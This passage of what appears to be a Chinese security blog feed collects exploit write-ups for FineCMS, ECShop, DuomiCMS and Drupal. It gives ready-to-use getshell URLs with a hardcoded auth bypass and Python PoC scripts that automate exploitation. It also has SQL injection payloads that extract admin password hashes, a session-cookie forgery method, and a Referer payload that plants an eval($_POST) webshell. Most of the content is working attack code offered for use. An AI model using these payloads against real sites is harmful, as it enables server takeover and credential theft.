&#123;</span><br><span class="line">                    $data = array(</span><br><span class="line">                        &apos;msg&apos; =&gt; &apos;ok&apos;,</span><br><span class="line">                        &apos;code&apos; =&gt; 1,</span><br><span class="line">                        &apos;return&apos; =&gt; $this-&gt;member_model-&gt;get_member($code[&apos;uid&apos;])</span><br><span class="line">                    );</span><br><span class="line">                &#125; elseif ($code == -1) &#123;</span><br><span class="line">                    $data = array(&apos;msg&apos; =&gt; fc_lang(&apos;会员不存在&apos;), &apos;code&apos; =&gt; 0);</span><br><span class="line">                &#125; elseif ($code == -2) &#123;</span><br><span class="line">                    $data = array(&apos;msg&apos; =&gt; fc_lang(&apos;密码不正确&apos;), &apos;code&apos; =&gt; 0);</span><br><span class="line">                &#125; elseif ($code == -3) &#123;</span><br><span class="line">                    $data = array(&apos;msg&apos; =&gt; fc_lang(&apos;Ucenter注册失败&apos;), &apos;code&apos; =&gt; 0);</span><br><span class="line">                &#125; elseif ($code == -4) &#123;</span><br><span class="line">                    $data = array(&apos;msg&apos; =&gt; fc_lang(&apos;Ucenter：会员名称不合法&apos;), &apos;code&apos; =&gt; 0);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; elseif ($param == &apos;update_avatar&apos;) &#123;</span><br><span class="line">                // 更新头像</span><br><span class="line">                $uid = (int)$_REQUEST[&apos;uid&apos;];</span><br><span class="line">                $file = $_REQUEST[&apos;file&apos;];</span><br><span class="line">                //</span><br><span class="line">                // 创建图片存储文件夹</span><br><span class="line">                $dir = SYS_UPLOAD_PATH.&apos;/member/&apos;.$uid.&apos;/&apos;;</span><br><span class="line">                @dr_dir_delete($dir);</span><br><span class="line">                if (!is_dir($dir)) &#123;</span><br><span class="line">                    dr_mkdirs($dir);</span><br><span class="line">                &#125;</span><br><span class="line">                $file = str_replace(&apos; &apos;, &apos;+&apos;, $file);</span><br><span class="line">                if (preg_match(&apos;/^(data:\s*image\/(\w+);base64,)/&apos;, $file, $result))&#123;</span><br><span class="line">                    $new_file = $dir.&apos;0x0.&apos;.$result[2];</span><br><span class="line">                    if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], &apos;&apos;, $file)))) &#123;</span><br><span class="line">                        $data = array(</span><br><span class="line">                            &apos;msg&apos; =&gt; &apos;目录权限不足或磁盘已满&apos;,</span><br><span class="line">                            &apos;code&apos; =&gt; 0</span><br><span class="line">                        );</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure><p>其中，首先</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file = $_REQUEST[&apos;file&apos;];</span><br></pre></td></tr></table></figure><p>获取$file变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&apos;/^(data:\s*image\/(\w+);base64,)/&apos;, $file, $result))&#123;</span><br><span class="line">                        $new_file = $dir.&apos;0x0.&apos;.$result[2];</span><br><span class="line">                        if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], &apos;&apos;, $file)))) &#123;</span><br><span class="line">                            $data = array(</span><br><span class="line">                                &apos;msg&apos; =&gt; &apos;目录权限不足或磁盘已满&apos;,</span><br><span class="line">                                &apos;code&apos; =&gt; 0</span><br><span class="line">                            );</span><br></pre></td></tr></table></figure><p>然后用preg_match函数进行正则匹配，因为$file变量可控，所以$result也是可控的，从而$new_file也是可控的，可以构造为php文件，然后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($new_file, base64_decode(str_replace($result[1], &apos;&apos;, $file))))</span><br></pre></td></tr></table></figure><p>对$result[1]进行base64解码，然后写入$new_file文件中。显然，是可以任意写文件进行getshell的。所以，我们要让程序能够运行到这些代码，不能在之前就退出了。要经过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$auth = $this-&gt;input-&gt;get(&apos;auth&apos;);</span><br><span class="line">if ($auth != md5(SYS_KEY))</span><br></pre></td></tr></table></figure><p>SYS_KEY被系统硬编码为24b16fede9a67c9251d3e7c7161c83ac，在C:phpStudyWWWconfigsystem.php中有定义。直接md5加密一次即可绕过</p><p>所以最终的payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:88/index.php?c=api&amp;m=data2&amp;auth=50ce0d2401ce4802751739552c8e4467&amp;param=update_avatar&amp;file=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure><p>无需登录，直接getshell,路径为<a href="http://localhost:88/uploadfile/member/0/0x0.php" target="_blank" rel="noopener">http://localhost:88/uploadfile/member/0/0x0.php</a><br><img src="FineCMS最新版5.0.8两处getshell/1.png" alt="1"></p><p><strong>第二处getshell</strong>：在文件C:/phpStudy/WWW/finecms/dayrui/controllers/member/Account.php中的upload函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/^(data:\s*image\/(\w+);base64,)/'</span>, $file, $result))&#123;</span><br><span class="line">                $new_file = $dir.<span class="string">'0x0.'</span>.$result[<span class="number">2</span>];</span><br><span class="line">                <span class="keyword">if</span> (!@file_put_contents($new_file, base64_decode(str_replace($result[<span class="number">1</span>], <span class="string">''</span>, $file)))) &#123;</span><br><span class="line">                    <span class="keyword">exit</span>(dr_json(<span class="number">0</span>, <span class="string">'目录权限不足或磁盘已满'</span>));</span><br></pre></td></tr></table></figure><p>注册会员，登录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">访问：http://localhost:88/index.php?s=member&amp;c=account&amp;m=upload</span><br><span class="line">POST：tx=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure><p><img src="FineCMS最新版5.0.8两处getshell/2.png" alt="2" style="zoom:75%;"></p><p><img src="FineCMS最新版5.0.8两处getshell/3.png" alt="3"></p><h2 id="0x03-Python批量poc脚本"><a href="#0x03-Python批量poc脚本" class="headerlink" title="0x03 Python批量poc脚本"></a>0x03 Python批量poc脚本</h2><p>pocsuite和poc-T是两个成熟的poc框架，不过感觉核心代码是别人的，只写一些poc插件的话，就是为别人造轮子，所以抽了一些代码写了个自己的工具，可能连轻型框架都算不上，只够自己用的。<br>第一处getshell的python代码（因为是直接getshell，无需登录，所以很简单）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(target)</span>:</span></span><br><span class="line">    payload=<span class="string">"/index.php?c=api&amp;m=data2&amp;auth=50ce0d2401ce4802751739552c8e4467&amp;param=update_avatar&amp;file=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+"</span></span><br><span class="line">    url=target+payload</span><br><span class="line">    shell=target+<span class="string">'/uploadfile/member/0/0x0.php'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result=requests.get(url,timeout=<span class="number">3</span>)</span><br><span class="line">        verify=requests.get(shell,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">if</span> verify.status_code==<span class="number">200</span> <span class="keyword">and</span> <span class="string">'code'</span> <span class="keyword">in</span> verify.text:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception,e:</span><br><span class="line">        <span class="keyword">print</span> e</span><br></pre></td></tr></table></figure><p>第二处getshell的Python代码（需要自动化注册、登录、利用）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Finecms version:5.0.8</span></span><br><span class="line"><span class="comment">#Author:404notfound</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    username=random.randint(<span class="number">0</span>,<span class="number">999999</span>)</span><br><span class="line">    seed = <span class="string">"1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span><br><span class="line">    email = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        email.append(random.choice(seed))</span><br><span class="line">    email = <span class="string">''</span>.join(email)</span><br><span class="line">    <span class="comment">#print email+"@"+email+".com"</span></span><br><span class="line">    <span class="comment">#print username</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#step 1 register</span></span><br><span class="line">    <span class="comment">#print "[+] register user"</span></span><br><span class="line">    register_url=url+<span class="string">"/index.php?s=member&amp;c=register&amp;m=index"</span></span><br><span class="line">    register_payload=&#123;<span class="string">"back"</span>:<span class="string">""</span>,<span class="string">"data[username]"</span>:username,<span class="string">"data[password]"</span>:<span class="string">"123456"</span>,<span class="string">"data[password2]"</span>:<span class="string">"123456"</span>,<span class="string">"data[email]"</span>:email+<span class="string">"@"</span>+email+<span class="string">".com"</span>&#125;</span><br><span class="line">    <span class="comment">#step 2 login</span></span><br><span class="line">    <span class="comment">#print "[+] user login"</span></span><br><span class="line">    login_url=url+<span class="string">"/index.php?s=member&amp;c=login&amp;m=index"</span></span><br><span class="line">    login_payload=&#123;<span class="string">"back"</span>:<span class="string">""</span>,<span class="string">"data[username]"</span>:username,<span class="string">"data[password]"</span>:<span class="string">"123456"</span>,<span class="string">"data[auto]"</span>:<span class="string">"1"</span>&#125;</span><br><span class="line">    <span class="comment">#step 3 attack</span></span><br><span class="line">    <span class="comment">#print "[+] loading payload"</span></span><br><span class="line">    vul_url=url+<span class="string">"/index.php?s=member&amp;c=account&amp;m=upload"</span></span><br><span class="line">    vul_payload=&#123;<span class="string">"tx"</span>:<span class="string">"data:image/php;base64,NDA0bm90Zm91bmQ8P3BocCBwaHBpbmZvKCk7Pz4="</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = requests.session()</span><br><span class="line">        resu=s.post(register_url,data=register_payload)</span><br><span class="line">        result=s.post(login_url,data=login_payload)</span><br><span class="line">        result2=s.post(vul_url,data=vul_payload).content</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"status"</span> <span class="keyword">in</span> result2:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception,e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        <span class="comment">#print e</span></span><br><span class="line">    <span class="comment">#print "[+] ALL DONE"</span></span><br><span class="line">    <span class="comment">#step 4 find shell path</span></span><br><span class="line">       </span><br><span class="line"><span class="comment">#print poc("http://localhost")</span></span><br></pre></td></tr></table></figure><p>get脚本github访问获取</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Ecshop/ECShop4.1.0%E5%89%8D%E5%8F%B0%E5%85%8D%E7%99%BB%E5%BD%95SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Ecshop/ECShop4.1.0%E5%89%8D%E5%8F%B0%E5%85%8D%E7%99%BB%E5%BD%95SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-漏洞概述"><a href="#0x00-漏洞概述" class="headerlink" title="0x00 漏洞概述"></a><strong>0x00 漏洞概述</strong></h2><p>影响版本：<strong>ecshop4.1.0及以下</strong><br>是否需要身份认证：<strong>否，前台漏洞</strong><br>漏洞类型：<strong>SQL注入</strong><br>CNVD编号：<strong>CNVD-2020-58823，*</strong><a href="https://www.cnvd.org.cn/flaw/show/2454613" target="_blank" rel="noopener">https://www.cnvd.org.cn/flaw/show/2454613</a><em><br>源码获取：</em><a href="https://www.ecshop.com/*，登录注册下载，最新版本为4.1.1(**已修复**)。" target="_blank" rel="noopener">https://www.ecshop.com/*，登录注册下载，最新版本为4.1.1(**已修复**)。</a></p><h2 id="0x01-漏洞详情"><a href="#0x01-漏洞详情" class="headerlink" title="0x01 漏洞详情"></a><strong>0x01 漏洞详情</strong></h2><p><strong>漏洞代码</strong>：/source/ecshop/delete_cart_goods.php,16行</p><p><img src="ECShop4.1.0前台免登录SQL注入/640" alt="图片">漏洞代码</p><p>$_POST变量直接传入sql语句进行拼接，再进入数据库查询，触发漏洞。</p><p>如果有对ecshop进行过代码审计的话，应该会知道在includes/safety.php存在个waf，<strong>但是在这个版本并没有生效，这里漏洞触发可以不进入这里的过滤防护逻辑</strong>。</p><p><img src="ECShop4.1.0前台免登录SQL注入/640" alt="图片">includes/safety.php</p><p>本地搭建验证如下，配置默认是开了报错，线上的测试环境也是，不存在报错的话可以通过盲注验证。报错注入的截图证明如下。</p><p><img src="ECShop4.1.0前台免登录SQL注入/640" alt="图片">本地漏洞验证</p><p>漏洞修复：对请求参数进行过滤。</p><p><img src="ECShop4.1.0前台免登录SQL注入/640" alt="图片">漏洞修复</p><h2 id="0x02-注入漏洞利用分析"><a href="#0x02-注入漏洞利用分析" class="headerlink" title="0x02 注入漏洞利用分析"></a><strong>0x02 注入漏洞利用分析</strong></h2><h3 id="思路一：获取注入获取管理员密码md5"><a href="#思路一：获取注入获取管理员密码md5" class="headerlink" title="思路一：获取注入获取管理员密码md5"></a>思路一：获取注入获取管理员密码md5</h3><p>ecshop默认密码不加盐，所以可以直接注入找到ecs_admin_user表获取管理员密码的md5.</p><h3 id="思路二：获取管理员session"><a href="#思路二：获取管理员session" class="headerlink" title="思路二：获取管理员session"></a>思路二：获取管理员session</h3><p>如果管理员使用了较为复杂的密码，md5解不出来时，可以考虑获取session。即cookie中ECSCP_ID的值。<br>登录用户的session存在ecs_sessions表，但是只有sesskey。</p><p><img src="ECShop4.1.0前台免登录SQL注入/640" alt="图片">ecs_sessions表</p><p>代码中登录成功后cookie设置：<code>setcookie($this-&gt;session_name, $this-&gt;session_id . $this-&gt;gen_session_key($this-&gt;session_id), 0, $this-&gt;session_cookie_path, $this-&gt;session_cookie_domain,  $this-&gt;session_cookie_secure, TRUE);</code>.</p><p>其中<code>$this-&gt;session_name</code> 就是ECSCP_ID， <code>$this-&gt;session_id . $this-&gt;gen_session_key($this→session_id)</code>就是最终cookie的值，数据库中sesskey对应的是<code>$this-&gt;session_id</code>，至于后半部分是通过gen_session_key这个函数生成。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function gen_session_key($session_id)</span><br><span class="line">    &#123;</span><br><span class="line">        static $ip = &apos;&apos;;</span><br><span class="line">        if ($ip == &apos;&apos;)</span><br><span class="line">        &#123;</span><br><span class="line">            $ip = substr($this-&gt;_ip, 0, strrpos($this-&gt;_ip, &apos;.&apos;));</span><br><span class="line">        &#125; </span><br><span class="line">        return sprintf(&apos;%08x&apos;, crc32(ROOT_PATH . $ip . $session_id));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>后半部分gen_session_key通过ip和ROOT_PATH来确认，ip也在session表中可以找到，至于ROOT_PATH，可以通过猜测或者部分路径的报错拿到。最后拼凑到的，就是最终的cookie。</p><h3 id="思路三-ecshop-api-client-includes-lib-api-php-写入shell"><a href="#思路三-ecshop-api-client-includes-lib-api-php-写入shell" class="headerlink" title="思路三: ecshop/api/client/includes/lib_api.php 写入shell"></a>思路三: ecshop/api/client/includes/lib_api.php 写入shell</h3><p>api/client 的访问需要登录，位于ecshop/api/client/includes/lib_api.php的API_UserLogin接口。这里登录是直接校验密码md5，也就是说当思路一解不出来时，这里也能用上密码的md5。</p><p><img src="ECShop4.1.0前台免登录SQL注入/640" alt="图片">api登录</p><p>登录成功后访问api接口，可以利用一个任意写入漏洞。触发点为upload_image函数，在API_AddBrand函数中被调用。</p><p><img src="ECShop4.1.0前台免登录SQL注入/640" alt="图片">upload_image函数</p><p><img src="ECShop4.1.0前台免登录SQL注入/640" alt="图片">调用upload_image函数</p><p>最后登录成功后写入文件的payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL: http://localhost/ecshop/api/client/api.php</span><br><span class="line"></span><br><span class="line">POST: Json= &#123;&quot;Action&quot;:&quot;AddBrand&quot;,&quot;brand_name&quot;:&quot;test&quot;,&quot;brand_logo&quot;:&#123;&quot;Data&quot;:&quot;xx,&quot;Type&quot;:&quot;xx&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="最后getshell"><a href="#最后getshell" class="headerlink" title="最后getshell"></a>最后getshell</h3><p>ecshop后台能读写文件的地方，大多做了限制。现在找到能shell的地方，就是在利用smarty模板渲染来执行代码，可参考ecshop原来爆过的一个任意代码执行漏洞，这里简要概述下。</p><ol><li>首先插入代码，在模板管理里找到邮件模板，修改为<code>{str:{\$asd&#39;];assert(base64_decode(&#39;ZmlsZV9wdXRfY29udGVudHMoJ3hjaGVjay5waHAnLCc8P3BocCBwaHBpbmZvKCk7Jyk7IA==&#39;));//}x</code></li></ol><p><img src="ECShop4.1.0前台免登录SQL注入/640" alt="图片">payload</p><ol><li>再回到管理密码找回页面，点击确定，即可触发。</li></ol><p><img src="ECShop4.1.0前台免登录SQL注入/640" alt="图片">触发页面</p><p>分析如下：<code>$template[&#39;template_content&#39;]</code>为我们插入的数据。</p><p><img src="ECShop4.1.0前台免登录SQL注入/640" alt="图片">触发入口</p><p>跟进fetch函数，进入eval函数前还有个fetch_str函数，会对payload进行一些过滤，这里不展开细节。</p><p><img src="ECShop4.1.0前台免登录SQL注入/640" alt="图片">fetch函数</p><p><code>_eval</code>函数将过滤后的字符串拿过来进行执行。由于是无回显，所以payload采用的是写文件的方式。</p><p><img src="ECShop4.1.0前台免登录SQL注入/640" alt="图片">eval执行</p><h2 id="0x03-结束语"><a href="#0x03-结束语" class="headerlink" title="0x03 结束语"></a><strong>0x03 结束语</strong></h2><p>这个前台SQL注入较为简单，但是危害较高，只通过一些简单字符匹配规则去找类似这种漏洞的话，整个项目大概有三百多个，其中前台的风险大多被单双引号包裹且开了GPC防护</p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a><strong>0x04 参考</strong></h2><p><em>Ecshop 2.x/3.x SQL注入/任意代码执行漏洞分析：<a href="https://www.secrss.com/articles/4965" target="_blank" rel="noopener">https://www.secrss.com/articles/4965</a></em></p><p><img src="ECShop4.1.0前台免登录SQL注入/640" alt="图片"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Ecshop/ecshop2.x_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Ecshop/ecshop2.x_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h2><p><strong>ecshop2.x</strong></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p><strong>Referer处。</strong></p><h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><pre><code>Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&quot;num&quot;;s:280:&quot;*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:3:&quot;&apos;/*&quot;;}</code></pre><p> 在网站根目录下生成1.php的一句话。</p><pre><code>assert(base64_decode(&apos;ZmlsZV9wdXRfY29udGVudHMoJzEucGhwJywnPD9waHAgZXZhbCgkX1BPU1RbMTMzN10pOyA/Picp&apos;));//}xxxfile_put_contents(&apos;1.php&apos;,&apos;&lt;?php eval($_POST[1337]); ?&gt;&apos;)</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Ecshop/ecshop2.x_SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/Ecshop/ecshop2.x_SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p><strong>Referer处。</strong></p><h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><pre><code>Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/DuomiCMS/DuomiCMS3.0%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/DuomiCMS/DuomiCMS3.0%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h4 id="漏洞详情："><a href="#漏洞详情：" class="headerlink" title="漏洞详情："></a>漏洞详情：</h4><p> payload 如下：</p><pre><code>http://localhost/search.php?searchword={if:phpinfo()}phpinfo(){end</code></pre><p><img src="DuomiCMS3.0前台代码执行/20180930142624-c113a95e-c479-1.png" alt></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/2828#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/2828#toc-2</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/DuomiCMS/DuomiCMS3.0SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/DuomiCMS/DuomiCMS3.0SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h4 id="漏洞详情："><a href="#漏洞详情：" class="headerlink" title="漏洞详情："></a>漏洞详情：</h4><p> payload ：</p><pre><code>ajax.php?action=addfav&amp;id=1&amp;uid=1 and extractvalue(1,concat_ws(0x3A,0x3A,version()))</code></pre><p><img src="DuomiCMS3.0SQL注入/20180930142726-e62f0396-c479-1.png" alt></p><p>但是要想爆出有用的数据，这里还要绕过 duomiphp/sql.class.php 文件的SQL检测规则以及全局变量的 _RunMagicQuotes 函数的转义。这里直接给出我测试成功的 payload ：</p><pre><code>http://localhost//duomiphp/ajax.php?action=addfav&amp;id=1&amp;uid=10101 and `&apos;`.``.vid and extractvalue(1,concat_ws(0x3A,0x3A,(select`password` from`duomi_admin` limit 1))) and `&apos;`.``.vid</code></pre><p><img src="DuomiCMS3.0SQL注入/20180930142732-e978a926-c479-1.png" alt></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/2828#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/2828#toc-2</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/drupal/Drupal%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2017-6920)/"/>
      <url>/2021/07/16/01-CMS%E6%BC%8F%E6%B4%9E/drupal/Drupal%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2017-6920)/</url>
      
        <content type="html"><![CDATA[<h1 id="About-Drupal"><a href="#About-Drupal" class="headerlink" title="About Drupal"></a>About Drupal</h1><p>Drupal是使用PHP语言编写的开源内容管理框架（CMF），它由内容管理系统（CMS）和PHP开发框架（Framework）共同构成。连续多年荣获全球最佳CMS大奖，是基于PHP语言最著名的WEB应用程序。截止2011年底，共有13,802位WEB专家参加了Drupal的开发工作；228个国家使用181种语言的729,791位网站设计工作者使用Drupal。著名案例包括：联合国、美国白宫、美国商务部、纽约时报、华纳、迪斯尼、联邦快递、索尼、美国哈佛大学、Ubuntu等。</p><h1 id="Vulnerability-list"><a href="#Vulnerability-list" class="headerlink" title="Vulnerability list"></a>Vulnerability list</h1><p><a href="https://github.com/zhzyker/exphub/tree/master/drupal" target="_blank" rel="noopener"><strong>cve-2018-7600_cmd.py</strong></a> Drupal Drupalgeddon 2 远程代码执行漏洞利用脚本<a href="https://freeerror.org/d/426" target="_blank" rel="noopener">[使用]</a><br><a href="https://github.com/zhzyker/exphub/tree/master/drupal" target="_blank" rel="noopener"><strong>cve-2018-7600_poc.py</strong></a> 该脚本可检测 CVE-2018-7602 和 CVE-2018-7600<br><a href="https://github.com/zhzyker/exphub/tree/master/drupal" target="_blank" rel="noopener"><strong>cve-2018-7602_cmd.py</strong></a> Drupal 内核远程代码执行漏洞利用脚本(需要账户密码)<br><a href="https://github.com/zhzyker/exphub/tree/master/drupal" target="_blank" rel="noopener"><strong>cve-2018-7602_poc.py</strong></a> 该脚本可检测 CVE-2018-7602 和 CVE-2018-7600 </p><h1 id="Readme"><a href="#Readme" class="headerlink" title="Readme"></a>Readme</h1><p>部分脚本文件使用说明，详细使用分析请参考<a href="https://github.com/zhzyker/exphub/tree/master/drupal#vulnerability-list" target="_blank" rel="noopener">vulnerability-list</a>中的[使用]</p><ul><li>VER: 漏洞影响版本，一般情况下不在影响范围的版本没有相关漏洞</li><li>USE: 脚本文件使用说明，大部分写在了脚本里，执行即可见</li><li>EXP: 脚本利用示例，以及执行效果</li><li>DES: 部分特殊脚本文件的特殊描述</li></ul><p><strong>脚本内容在github获取</strong></p><h2 id="CVE-2018-7600-cmd-py-Drupal-Drupalgeddon-2-远程代码执行漏洞利用脚本"><a href="#CVE-2018-7600-cmd-py-Drupal-Drupalgeddon-2-远程代码执行漏洞利用脚本" class="headerlink" title="CVE-2018-7600_cmd.py    Drupal Drupalgeddon 2 远程代码执行漏洞利用脚本"></a>CVE-2018-7600_cmd.py    Drupal Drupalgeddon 2 远程代码执行漏洞利用脚本</h2><blockquote><p>USE:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt; +----------------------------------------------------------------------+</span><br><span class="line">&gt; + DES: by zhzyker as https://github.com/zhzyker/exphub                 +</span><br><span class="line">&gt; +      Drupal Drupalgeddon 2 远程代码执行 CVE-2018-7600                +</span><br><span class="line">&gt; +----------------------------------------------------------------------+</span><br><span class="line">&gt; + USE: python3 &lt;filename&gt; &lt;url&gt;                                        +</span><br><span class="line">&gt; + EXP: python3 cve-2018-7600_cmd.py http://1.1.1.1:8080                +</span><br><span 